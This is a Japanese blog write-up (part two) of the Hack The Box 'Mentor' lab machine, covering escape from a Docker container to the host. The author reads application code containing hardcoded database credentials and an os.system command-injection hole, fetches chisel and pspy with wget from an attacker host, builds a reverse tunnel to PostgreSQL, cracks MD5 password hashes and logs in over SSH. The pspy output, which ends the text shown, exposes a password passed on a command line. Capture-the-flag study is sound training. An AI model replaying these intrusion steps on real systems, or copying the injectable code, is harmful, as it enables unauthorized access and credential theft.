# 初めに

どうも、クソ雑魚のなんちゃてエンジニアです。
本記事は ___Hack The Box___(以下リンク参照) の「___Mentor___」にチャレンジした際の ___WriteUp - その２___ になります。
※以前までのツールの使い方など詳細を書いたものではないのでご了承ください。

___※悪用するのはやめてください。あくまで社会への貢献のためにこれらの技術を使用してください。法に触れるので。___

https://www.hackthebox.com/

「WriteUp - その１」については以下です。

https://qiita.com/schectman-hell/items/78e61e653e49d18be727

# Discovery
前回はDockerコンテナ内のシェルを獲得することに成功した。
このコンテナからホスト側に抜けるための手がかりを調査していこうと思う。
以下の初期階層からとりあえず/app/appへ調査を進める。
```bash
/app # ls -lta
total 24
drwxr-xr-x    1 root     root          4096 Dec 27 03:37 ..
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 .
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 app
-rw-r--r--    1 root     root           522 Nov  3 12:58 Dockerfile
-rw-r--r--    1 root     root          1024 Jun 12  2022 .Dockerfile.swp
-rw-r--r--    1 root     root           672 Jun  4  2022 requirements.txt
```

```bash
/app # cd app
/app/app # ls -lta
total 28
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 .
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 ..
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 __pycache__
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 api
-rw-r--r--    1 root     root          1001 Jun  7  2022 db.py
-rw-r--r--    1 root     root             0 Jun  4  2022 __init__.py
-rw-r--r--    1 root     root             0 Jun  4  2022 config.py
-rw-r--r--    1 root     root          1149 Jun  4  2022 main.py
-rw-r--r--    1 root     root           704 Jun  4  2022 requirements.txt
```
`main.py`はコンテナ起動時のソースファイルみたいだが、`config.py`, `db.py`は初見である。
確認してみる。
```bash
/app/app # more config.py
/app/app # more db.py
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)

/app/app # 
```
`config.py`は何も表示されなかったが、`db.py`には接続情報（DBへのクレデンシャル）が書いてある。
これは有用では？
一応/app/app/api階層も確認しておく。

```bash
/app/app # cd api
/app/app/api # ls -lta
total 40
drwxr-xr-x    1 root     root          4096 Dec 12 10:25 __pycache__
-rw-r--r--    1 root     root          1785 Dec 12 10:25 utils.py
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 .
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 ..
-rw-r--r--    1 root     root           977 Nov  3 13:13 admin.py
-rw-r--r--    1 root     root             0 Jun  4  2022 __init__.py
-rw-r--r--    1 root     root          1117 Jun  4  2022 auth.py
-rw-r--r--    1 root     root          1734 Jun  4  2022 crud.py
-rw-r--r--    1 root     root           662 Jun  4  2022 models.py
-rw-r--r--    1 root     root          2026 Jun  4  2022 quotes.py
-rw-r--r--    1 root     root          1437 Jun  4  2022 users.py
/app/app/api # more admin.py
from fastapi import APIRouter, Depends
from app.api.utils import is_admin, is_logged
from app.api.models import backup
import os

router = APIRouter()

WORK_DIR = os.getenv('WORK_DIR', '/app')
DATABASE_URL = os.getenv('DATABASE_URL', 'postgresql://postgres:postgres@192.168.1.4/hello_fastapi_dev')

@router.get('/', dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)
async def admin_funcs():
    return {"admin_funcs":{"check db connection":"/check","backup the application": "/backup"}}

@router.get('/check',dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)
async def check_connection():
    return {"details": "Not implemented yet!"}


# Take a backup of the application
@router.post("/backup",dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)
async def backup(payload: backup):
    os.system(f'tar -c -f {str(payload.path)}/app_backkup.tar {str(WORK_DIR)} &')
    return {"INFO": "Done!"}

/app/app/api # 
/app/app/api # 
/app/app/api # more auth.py        
from app.api import crud
from app.api.models import userDB, userSchema
from app.api.utils import create_jwt, is_a_user
from .utils import *
from fastapi import APIRouter, HTTPException, Header, Path, FastAPI, Depends, Request
from typing import List 
import os

router = APIRouter()
SECRET =  os.getenv('SECRET')

# Login a user
@router.post('/login')
async def login(payload: userSchema):
    global SECRET
    success = await crud.login(payload)
    if success is None:
        raise HTTPException(status_code=403, detail="Not authorized!") 

    else:
        return create_jwt(payload.username, payload.email)

# Signing up a new user
@router.post("/signup", response_model=userDB, status_code=201)
async def create_user(payload: userSchema):
    user = await is_a_user(payload)
    if user is None:
        pass
    else:
        raise HTTPException(status_code=424, detail="User already exists! ")
    user_id = await crud.create_user(payload)

    res = {
        "id" : user_id,
        "email" : payload.email,
        "username" : payload.username
    }

    return res
/app/app/api # 
/app/app/api # 
/app/app/api # more crud.py
from app.api.models import quoteSchema, userSchema
from app.db import quotes, database, users
import hashlib


# Quote crud
async def post(payload: quoteSchema):
    query = quotes.insert().values(title=payload.title, description=payload.description)
    return await database.execute(query=query)

async def get(id: int):
    query = quotes.select().where(id == quotes.c.id)
    return await database.fetch_one(query=query)
    

async def get_all():
    query = quotes.select()
    return await database.fetch_all(query=query)


async def put(id:int, payload=quoteSchema):
    query = (
        quotes.update().where(id == quotes.c.id).values(title=payload.title, description=payload.description)
        .returning(quotes.c.id)
    )
    return await database.execute(query=query)

async def delete(id:int):
    query = quotes.delete().where(id == quotes.c.id)
    return await database.execute(query=query)


# User crud
async def get_user(id: int):
    query = users.select().where(id == users.c.id)
    return await database.fetch_one(query=query)

async def get_users():
    query = users.select()
    return await database.fetch_all(query=query)

async def create_user(payload: userSchema):
    query = users.insert().values(email=payload.email, username=payload.username, password=hashlib.md5(str(payload.password).encode()).hexdigest())
    return await database.execute(query=query)

async def login(payload: userSchema):
    try:
        query = users.select().where(payload.email == users.c.email, payload.username == users.c.username , hashlib.md5(str(payload.password).encode()).hexdigest() == users.c.password)
    
        return await database.fetch_one(query=query)

    except Exception as e:
        return None
```
こっちはAPI機能のコードみたいである。
ならこっちの接続情報よりは以下のPassword情報が落ちているテーブルを探った方が良さそうである。
```python:db.py
...
# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)
...
```
コンテナから`psql`コマンドが通るか確認してみる。
```bash
/app/app # psql --version
/bin/sh: psql: not found
```
ダメだわ。
んじゃ`chisel`でトンネル通してコマンドを送ってDBに接続してみる。

# Credential Access
## Chisel
以下サイトからamd64のバージョンをインストール。

https://github.com/jpillora/chisel/releases

Kaliをサーバー側、Dockerコンテナ側をクライアント側で設定する。
```bash:kali
┌──(root💀kali)-[~/work]
└─# ./chisel_1.7.7_linux_amd64 server --port 1234 --reverse
2022/12/27 13:07:07 server: Reverse tunnelling enabled
2022/12/27 13:07:07 server: Fingerprint 2Mi2ncjfELxV++nBzP4yWb79ilDyfxB2gUynXgmvykg=
2022/12/27 13:07:07 server: Listening on http://0.0.0.0:1234
2022/12/27 13:07:56 server: session#1: tun: proxy#R:5432=>172.22.0.1:5432: Listening
```
```bash:Dockerコンテナ
/tmp # wget http://10.10.14.75/chisel_1.7.7_linux_amd64
Connecting to 10.10.14.75 (10.10.14.75:80)
chisel_1.7.7_linux_a   0% |                                | 33125  0:04:03 ETA
chisel_1.7.7_linux_a   1% |                                |  109k  0:02:21 ETA
chisel_1.7.7_linux_a   3% |*                               |  265k  0:01:26 ETA
chisel_1.7.7_linux_a   5% |*                               |  447k  0:01:06 ETA
chisel_1.7.7_linux_a   7% |**                              |  597k  0:01:00 ETA
chisel_1.7.7_linux_a   9% |**                              |  715k  0:01:00 ETA
chisel_1.7.7_linux_a  10% |***                             |  846k  0:00:58 ETA
chisel_1.7.7_linux_a  12% |***                             |  978k  0:00:56 ETA
chisel_1.7.7_linux_a  13% |****                            | 1089k  0:00:56 ETA
chisel_1.7.7_linux_a  15% |****                            | 1212k  0:00:55 ETA
chisel_1.7.7_linux_a  17% |*****                           | 1349k  0:00:53 ETA
chisel_1.7.7_linux_a  18% |*****                           | 1462k  0:00:52 ETA
chisel_1.7.7_linux_a  19% |******                          | 1574k  0:00:52 ETA
chisel_1.7.7_linux_a  21% |******                          | 1661k  0:00:52 ETA
chisel_1.7.7_linux_a  22% |*******                         | 1755k  0:00:52 ETA
chisel_1.7.7_linux_a  23% |*******                         | 1854k  0:00:52 ETA
chisel_1.7.7_linux_a  24% |*******                         | 1949k  0:00:51 ETA
chisel_1.7.7_linux_a  25% |********                        | 2047k  0:00:51 ETA
chisel_1.7.7_linux_a  27% |********                        | 2131k  0:00:51 ETA
chisel_1.7.7_linux_a  28% |*********                       | 2241k  0:00:50 ETA
chisel_1.7.7_linux_a  29% |*********                       | 2347k  0:00:49 ETA
chisel_1.7.7_linux_a  30% |*********                       | 2427k  0:00:49 ETA
chisel_1.7.7_linux_a  31% |**********                      | 2505k  0:00:49 ETA
chisel_1.7.7_linux_a  32% |**********                      | 2580k  0:00:49 ETA
chisel_1.7.7_linux_a  33% |**********                      | 2615k  0:00:50 ETA
chisel_1.7.7_linux_a  33% |**********                      | 2622k  0:00:52 ETA
chisel_1.7.7_linux_a  33% |**********                      | 2624k  0:00:54 ETA
chisel_1.7.7_linux_a  33% |**********                      | 2625k  0:00:56 ETA
chisel_1.7.7_linux_a  33% |**********                      | 2630k  0:00:57 ETA
chisel_1.7.7_linux_a  33% |**********                      | 2635k  0:00:59 ETA
chisel_1.7.7_linux_a  33% |**********                      | 2637k  0:01:01 ETA
chisel_1.7.7_linux_a  33% |**********                      | 2650k  0:01:03 ETA
chisel_1.7.7_linux_a  33% |**********                      | 2662k  0:01:04 ETA
chisel_1.7.7_linux_a  34% |**********                      | 2691k  0:01:05 ETA
chisel_1.7.7_linux_a  34% |***********                     | 2753k  0:01:05 ETA
chisel_1.7.7_linux_a  36% |***********                     | 2869k  0:01:02 ETA
chisel_1.7.7_linux_a  39% |************                    | 3114k  0:00:56 ETA
chisel_1.7.7_linux_a  44% |**************                  | 3536k  0:00:46 ETA
chisel_1.7.7_linux_a  53% |*****************               | 4229k  0:00:33 ETA
chisel_1.7.7_linux_a  65% |********************            | 5133k  0:00:21 ETA
chisel_1.7.7_linux_a  82% |**************************      | 6480k  0:00:08 ETA
chisel_1.7.7_linux_a 100% |********************************| 7888k  0:00:00 ETA
/tmp # 
/tmp # 
/tmp # 
/tmp # chmod +x chisel_1.7.7_linux_amd64 
/tmp #    
/tmp # ls -lta
total 7896
-rwxr-xr-x    1 root     root       8077312 Dec 27 04:02 chisel_1.7.7_linux_amd64
drwxrwxrwt    1 root     root          4096 Dec 27 04:01 .
prw-r--r--    1 root     root             0 Dec 27 03:56 f
drwxr-xr-x    1 root     root          4096 Dec 27 03:56 ..
/tmp # 
/tmp # 
/tmp # 
/tmp # ./chisel_1.7.7_linux_amd64 client -v 10.10.14.75:1234 R:5432:172.22.0.1:5432
2022/12/27 04:07:54 client: Connecting to ws://10.10.14.75:1234
2022/12/27 04:07:55 client: Handshaking...
2022/12/27 04:07:56 client: Sending config
2022/12/27 04:07:56 client: Connected (Latency 256.927771ms)
2022/12/27 04:07:56 client: tun: SSH connected
2022/12/27 04:09:04 client: tun: conn#1: Open [1/1]
2022/12/27 04:09:04 client: tun: conn#1: sent 99B received 14B
2022/12/27 04:09:04 client: tun: conn#1: Close [0/1]
2022/12/27 04:09:24 client: tun: conn#2: Open [1/2]
```
トンネルが開通するので、これでKali上からlocalhostの5432向けに`psql`コマンドを打ち込めば通るはずである。
※上記「Dockerコンテナ側のOpen, Close」を見ればわかるが、繋がっている。

## PostgreSQL
usersテーブルから引っ張ってみると以下の様にクレデンシャルを見つけることに成功する。
![28.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2036848/f851bea6-7830-a42f-187a-938bf6aa0252.png)
見た感じMD5なので、簡易的に以下サイトで復元できるか確認する。

https://hashtoolkit.com/

SVCのハッシュは以下の様に復元可能であった。
![29.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2036848/3becbe46-a7b8-0132-733c-4b57f1a0c3ad.png)

# Persistence
見つけたSVCのクレデンシャルでSSHアクセスしてみる。
![30.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2036848/a7af63ba-39bf-a4f2-7fb6-2d320eeb3219.png)
いった！！！
これでUserフラグゲットだぜ！！！

続いては特権昇格を目指していこうと思う。

# Privilege Escalation - Horizontal
## 情報収集
特権昇格のための情報収集をまずは実施する。
### sudo -l
No Passwordで行けるか確認。
```bash
svc@mentor:~$ sudo -l
[sudo] password for svc: 
Sorry, user svc may not run sudo on mentor.
```
いい情報はない。
### pspy
何かいいプロセス動いてないかなぁ～とか思いながらpspy動かします。
pspyの実行ファイルを以下のサイトから入手。64bit版をダウンロード。

https://github.com/DominicBreuker/pspy

入手後はターゲットに実行ファイルを送信するために簡易的なWebサーバを立ち上げます。
```bash
┌──(root💀kali)-[~/work]
└─# python3 -m http.server 80
```
攻撃対象サーバへ転送します。
```bash
svc@mentor:/tmp$ wget http://10.10.14.75/pspy64
```
`chmod +x`で実行権限を与えた後に実行!
```bash
svc@mentor:/tmp$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/12/27 04:53:21 CMD: UID=0    PID=99     | 
2022/12/27 04:53:21 CMD: UID=0    PID=98     | 
2022/12/27 04:53:21 CMD: UID=0    PID=97     | 
2022/12/27 04:53:21 CMD: UID=0    PID=96     | 
2022/12/27 04:53:21 CMD: UID=0    PID=95     | 
2022/12/27 04:53:21 CMD: UID=0    PID=937    | /usr/sbin/ModemManager 
2022/12/27 04:53:21 CMD: UID=0    PID=93     | 
2022/12/27 04:53:21 CMD: UID=0    PID=92     | 
2022/12/27 04:53:21 CMD: UID=0    PID=909    | /usr/libexec/udisks2/udisksd 
2022/12/27 04:53:21 CMD: UID=0    PID=908    | /lib/systemd/systemd-logind 
2022/12/27 04:53:21 CMD: UID=0    PID=907    | /usr/lib/snapd/snapd 
2022/12/27 04:53:21 CMD: UID=107  PID=906    | /usr/sbin/rsyslogd -n -iNONE 
2022/12/27 04:53:21 CMD: UID=0    PID=905    | /usr/libexec/polkitd --no-debug 
2022/12/27 04:53:21 CMD: UID=0    PID=904    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2022/12/27 04:53:21 CMD: UID=0    PID=903    | /usr/sbin/irqbalance --foreground 
2022/12/27 04:53:21 CMD: UID=0    PID=9      | 
2022/12/27 04:53:21 CMD: UID=103  PID=898    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2022/12/27 04:53:21 CMD: UID=0    PID=89     | 
2022/12/27 04:53:21 CMD: UID=0    PID=88     | 
2022/12/27 04:53:21 CMD: UID=0    PID=87     | 
2022/12/27 04:53:21 CMD: UID=0    PID=86     | 
2022/12/27 04:53:21 CMD: UID=0    PID=85     | 
2022/12/27 04:53:21 CMD: UID=0    PID=84     | 
2022/12/27 04:53:21 CMD: UID=0    PID=83     | 
2022/12/27 04:53:21 CMD: UID=0    PID=82     | 
2022/12/27 04:53:21 CMD: UID=0    PID=81     | 
2022/12/27 04:53:21 CMD: UID=0    PID=806    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0                                                                                                                             
2022/12/27 04:53:21 CMD: UID=0    PID=782    | /usr/bin/vmtoolsd 
2022/12/27 04:53:21 CMD: UID=0    PID=781    | /usr/bin/VGAuthService 
2022/12/27 04:53:21 CMD: UID=104  PID=766    | /lib/systemd/systemd-timesyncd 
2022/12/27 04:53:21 CMD: UID=102  PID=765    | /lib/systemd/systemd-resolved 
2022/12/27 04:53:21 CMD: UID=0    PID=713    | 
2022/12/27 04:53:21 CMD: UID=0    PID=706    | 
2022/12/27 04:53:21 CMD: UID=0    PID=7      | 
2022/12/27 04:53:21 CMD: UID=101  PID=583    | /lib/systemd/systemd-networkd 
2022/12/27 04:53:21 CMD: UID=0    PID=565    | /lib/systemd/systemd-udevd 
2022/12/27 04:53:21 CMD: UID=0    PID=556    | /sbin/multipathd -d -s 
2022/12/27 04:53:21 CMD: UID=0    PID=553    | 
2022/12/27 04:53:21 CMD: UID=0    PID=552    | 
2022/12/27 04:53:21 CMD: UID=0    PID=550    | 
2022/12/27 04:53:21 CMD: UID=0    PID=547    | 
2022/12/27 04:53:21 CMD: UID=0    PID=516    | /lib/systemd/systemd-journald 
2022/12/27 04:53:21 CMD: UID=0    PID=5      | 
2022/12/27 04:53:21 CMD: UID=0    PID=455    | 
2022/12/27 04:53:21 CMD: UID=0    PID=454    | 
2022/12/27 04:53:21 CMD: UID=0    PID=4      | 
2022/12/27 04:53:21 CMD: UID=0    PID=396    | 
2022/12/27 04:53:21 CMD: UID=0    PID=365    | 
2022/12/27 04:53:21 CMD: UID=0    PID=363    | 
2022/12/27 04:53:21 CMD: UID=0    PID=34     | 
2022/12/27 04:53:21 CMD: UID=0    PID=338    | 
2022/12/27 04:53:21 CMD: UID=0    PID=337    | 
2022/12/27 04:53:21 CMD: UID=0    PID=33     | 
2022/12/27 04:53:21 CMD: UID=0    PID=32     | 
2022/12/27 04:53:21 CMD: UID=0    PID=319    | 
2022/12/27 04:53:21 CMD: UID=0    PID=316    | 
2022/12/27 04:53:21 CMD: UID=0    PID=313    | 
2022/12/27 04:53:21 CMD: UID=0    PID=31     | 
2022/12/27 04:53:21 CMD: UID=0    PID=307    | 
2022/12/27 04:53:21 CMD: UID=0    PID=306    | 
2022/12/27 04:53:21 CMD: UID=0    PID=305    | 
2022/12/27 04:53:21 CMD: UID=0    PID=304    | 
2022/12/27 04:53:21 CMD: UID=0    PID=303    | 
2022/12/27 04:53:21 CMD: UID=0    PID=302    | 
2022/12/27 04:53:21 CMD: UID=0    PID=301    | 
2022/12/27 04:53:21 CMD: UID=0    PID=300    | 
2022/12/27 04:53:21 CMD: UID=0    PID=30     | 
2022/12/27 04:53:21 CMD: UID=0    PID=3      | 
2022/12/27 04:53:21 CMD: UID=0    PID=299    | 
2022/12/27 04:53:21 CMD: UID=0    PID=298    | 
2022/12/27 04:53:21 CMD: UID=0    PID=297    | 
2022/12/27 04:53:21 CMD: UID=0    PID=296    | 
2022/12/27 04:53:21 CMD: UID=0    PID=295    | 
2022/12/27 04:53:21 CMD: UID=0    PID=294    | 
2022/12/27 04:53:21 CMD: UID=0    PID=293    | 
2022/12/27 04:53:21 CMD: UID=0    PID=292    | 
2022/12/27 04:53:21 CMD: UID=0    PID=291    | 
2022/12/27 04:53:21 CMD: UID=0    PID=290    | 
2022/12/27 04:53:21 CMD: UID=0    PID=29     | 
2022/12/27 04:53:21 CMD: UID=0    PID=289    | 
2022/12/27 04:53:21 CMD: UID=0    PID=288    | 
2022/12/27 04:53:21 CMD: UID=0    PID=287    | 
2022/12/27 04:53:21 CMD: UID=0    PID=286    | 
2022/12/27 04:53:21 CMD: UID=0    PID=284    | 
2022/12/27 04:53:21 CMD: UID=0    PID=283    | 
2022/12/27 04:53:21 CMD: UID=0    PID=281    | 
2022/12/27 04:53:21 CMD: UID=0    PID=280    | 
2022/12/27 04:53:21 CMD: UID=0    PID=28     | 
2022/12/27 04:53:21 CMD: UID=0    PID=279    | 
2022/12/27 04:53:21 CMD: UID=0    PID=277    | 
2022/12/27 04:53:21 CMD: UID=0    PID=276    | 
2022/12/27 04:53:21 CMD: UID=0    PID=275    | 
2022/12/27 04:53:21 CMD: UID=0    PID=274    | 
2022/12/27 04:53:21 CMD: UID=0    PID=273    | 
2022/12/27 04:53:21 CMD: UID=0    PID=272    | 
2022/12/27 04:53:21 CMD: UID=0    PID=271    | 
2022/12/27 04:53:21 CMD: UID=0    PID=27     | 
2022/12/27 04:53:21 CMD: UID=0    PID=269    | 
2022/12/27 04:53:21 CMD: UID=0    PID=268    | 
2022/12/27 04:53:21 CMD: UID=0    PID=265    | 
2022/12/27 04:53:21 CMD: UID=0    PID=261    | 
2022/12/27 04:53:21 CMD: UID=0    PID=26     | 
2022/12/27 04:53:21 CMD: UID=0    PID=257    | 
2022/12/27 04:53:21 CMD: UID=1001 PID=2568   | ./pspy64 
2022/12/27 04:53:21 CMD: UID=0    PID=2560   | 
2022/12/27 04:53:21 CMD: UID=0    PID=255    | 
2022/12/27 04:53:21 CMD: UID=0    PID=253    | 
2022/12/27 04:53:21 CMD: UID=0    PID=2525   | 
2022/12/27 04:53:21 CMD: UID=0    PID=250    | 
2022/12/27 04:53:21 CMD: UID=0    PID=25     | 
2022/12/27 04:53:21 CMD: UID=1001 PID=2488   | -bash 
2022/12/27 04:53:21 CMD: UID=1001 PID=2484   | sshd: svc@pts/0      
2022/12/27 04:53:21 CMD: UID=0    PID=246    | 
2022/12/27 04:53:21 CMD: UID=0    PID=24     | 
2022/12/27 04:53:21 CMD: UID=0    PID=2384   | 
2022/12/27 04:53:21 CMD: UID=1001 PID=2379   | (sd-pam) 
2022/12/27 04:53:21 CMD: UID=1001 PID=2378   | /lib/systemd/systemd --user 
2022/12/27 04:53:21 CMD: UID=0    PID=2376   | 
2022/12/27 04:53:21 CMD: UID=0    PID=2374   | sshd: svc [priv]     
2022/12/27 04:53:21 CMD: UID=999  PID=2320   | postgres: postgres mentorquotes_db 172.22.0.1(59378) idle 
2022/12/27 04:53:21 CMD: UID=0    PID=232    | 
2022/12/27 04:53:21 CMD: UID=0    PID=2319   | 
2022/12/27 04:53:21 CMD: UID=0    PID=230    | 
2022/12/27 04:53:21 CMD: UID=0    PID=228    | 
2022/12/27 04:53:21 CMD: UID=0    PID=227    | 
2022/12/27 04:53:21 CMD: UID=0    PID=226    | 
2022/12/27 04:53:21 CMD: UID=0    PID=225    | 
2022/12/27 04:53:21 CMD: UID=0    PID=224    | 
2022/12/27 04:53:21 CMD: UID=0    PID=223    | 
2022/12/27 04:53:21 CMD: UID=0    PID=222    | 
2022/12/27 04:53:21 CMD: UID=0    PID=2214   | 
2022/12/27 04:53:21 CMD: UID=0    PID=221    | 
2022/12/27 04:53:21 CMD: UID=0    PID=220    | 
2022/12/27 04:53:21 CMD: UID=0    PID=22     | 
2022/12/27 04:53:21 CMD: UID=0    PID=219    | 
2022/12/27 04:53:21 CMD: UID=0    PID=218    | 
2022/12/27 04:53:21 CMD: UID=0    PID=217    | 
2022/12/27 04:53:21 CMD: UID=0    PID=216    | 
2022/12/27 04:53:21 CMD: UID=0    PID=2158   | 
2022/12/27 04:53:21 CMD: UID=0    PID=215    | 
2022/12/27 04:53:21 CMD: UID=0    PID=214    | 
2022/12/27 04:53:21 CMD: UID=0    PID=213    | 
2022/12/27 04:53:21 CMD: UID=1001 PID=2126   | /usr/bin/python3 /usr/local/bin/login.py kj23sadkj123as0-d213 
2022/12/27 04:53:21 CMD: UID=0    PID=212    | 
2022/12/27 04:53:21 CMD: UID=0    PID=211    | 
2022/12/27 04:53:21 CMD: UID=0    PID=210    | 
2022/12/27 04:53:21 CMD: UID=0    PID=21     | 
2022/12/27 04:53:21 CMD: UID=999  PID=2090   | postgres: postgres mentorquotes_db 172.22.0.1(44186) idle 
2022/12/27 04:53:21 CMD: UID=0    PID=209    | 
2022/12/27 04:53:21 CMD: UID=0    PID=208    | 
2022/12/27 04:53:21 CMD: UID=0    PID=206    | 
2022/12/27 04:53:21 CMD: UID=0    PID=205    | 
2022/12/27 04:53:21 CMD: UID=0    PID=2048   | /usr/local/bin/python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork                                                                                                                                   
2022/12/27 04:53:21 CMD: UID=0    PID=2047   | /usr/local/bin/python3 -c from multiprocessing.semaphore_tracker import main;main(4) 
2022/12/27 04:53:21 CMD: UID=0    PID=204    | 
2022/12/27 04:53:21 CMD: UID=0    PID=203    | 
2022/12/27 04:53:21 CMD: UID=0    PID=2028   | python main.py 
2022/12/27 04:53:21 CMD: UID=0    PID=2007   | /usr/bin/containerd-shim-runc-v2 -namespace moby -id 85068d3d37a2d9985e32cc75d0e3f9515d96bb52d758f9818e784b2636868565 -address /run/containerd/containerd.sock                                                                                                           
2022/12/27 04:53:21 CMD: UID=0    PID=20     | 
2022/12/27 04:53:21 CMD: UID=0    PID=2      | 
2022/12/27 04:53:21 CMD: UID=0    PID=1988   | /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80                                                                                                                                                           
2022/12/27 04:53:21 CMD: UID=0    PID=1916   | python3 -m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000 
2022/12/27 04:53:21 CMD: UID=999  PID=1913   | postgres: logical replication launcher  
2022/12/27 04:53:21 CMD: UID=999  PID=1912   | postgres: stats collector  
2022/12/27 04:53:21 CMD: UID=999  PID=1911   | postgres: autovacuum launcher  
2022/12/27 04:53:21 CMD: UID=999  PID=1910   | postgres: walwriter  
2022/12/27 04:53:21 CMD: UID=999  PID=1909   | postgres: background writer  
2022/12/27 04:53:21 CMD: UID=999  PID=1908   | postgres: checkpointer  
2022/12/27 04:53:21 CMD: UID=0    PID=19     | 
2022/12/27 04:53:21 CMD: UID=0    PID=1880   | /usr/bin/containerd-shim-runc-v2 -namespace moby -id dfcbb5c06004d196cfb167bde95e69c82d5c7f5d5203c831e8e38d9e5252f7a0 -address /run/containerd/containerd.sock                                                                                                           
2022/12/27 04:53:21 CMD: UID=0    PID=1864   | /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000                                                                                                                                                       
2022/12/27 04:53:21 CMD: UID=0    PID=18     | 
2022/12/27 04:53:21 CMD: UID=999  PID=1792   | postgres 
2022/12/27 04:53:21 CMD: UID=0    PID=1772   | /usr/bin/containerd-shim-runc-v2 -namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock                                                                                                           
2022/12/27 04:53:21 CMD: UID=0    PID=1759   | /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432                                                                                                                                                       
2022/12/27 04:53:21 CMD: UID=1001 PID=1693   | /bin/bash /usr/local/bin/login.sh 
2022/12/27 04:53:21 CMD: UID=0    PID=16     | 
2022/12/27 04:53:21 CMD: UID=0    PID=159    | 
2022/12/27 04:53:21 CMD: UID=0    PID=154    | 
2022/12/27 04:53:21 CMD: UID=0    PID=152    | 
2022/12/27 04:53:21 CMD: UID=0    PID=15     | 
2022/12/27 04:53:21 CMD: UID=0    PID=149    | 
2022/12/27 04:53:21 CMD: UID=0    PID=14     | 
2022/12/27 04:53:21 CMD: UID=0    PID=138    | 
2022/12/27 04:53:21 CMD: UID=0    PID=137    | 
2022/12/27 04:53:21 CMD: UID=0    PID=136    | 
2022/12/27 04:53:21 CMD: UID=0    PID=135    | 
2022/12/27 04:53:21 CMD: UID=0    PID=1338   | /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock 
2022/12/27 04:53:21 CMD: UID=0    PID=133    | 
2022/12/27 04:53:21 CMD: UID=0    PID=132    | 
2022/12/27 04:53:21 CMD: UID=0    PID=131    | 
2022/12/27 04:53:21 CMD: UID=0    PID=130    | 
2022/12/27 04:53:21 CMD: UID=0    PID=13     | 
2022/12/27 04:53:21 CMD: UID=0    PID=129    | 
2022/12/27 04:53:21 CMD: UID=33   PID=1277   | /usr/sbin/apache2 -k start 
2022/12/27 04:53:21 CMD: UID=33   PID=1276   | /usr/sbin/apache2 -k start 
2022/12/27 04:53:21 CMD: UID=0    PID=1275   | /usr/sbin/apache2 -k start 
2022/12/27 04:53:21 CMD: UID=0    PID=127    | 
2022/12/27 04:53:21 CMD: UID=0    PID=1260   | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2022/12/27 04:53:21 CMD: UID=0    PID=126    | 
2022/12/27 04:53:21 CMD: UID=0    PID=125    | 
2022/12/27 04:53:21 CMD: UID=0    PID=1240   | /usr/bin/containerd 
2022/12/27 04:53:21 CMD: UID=0    PID=124    | 
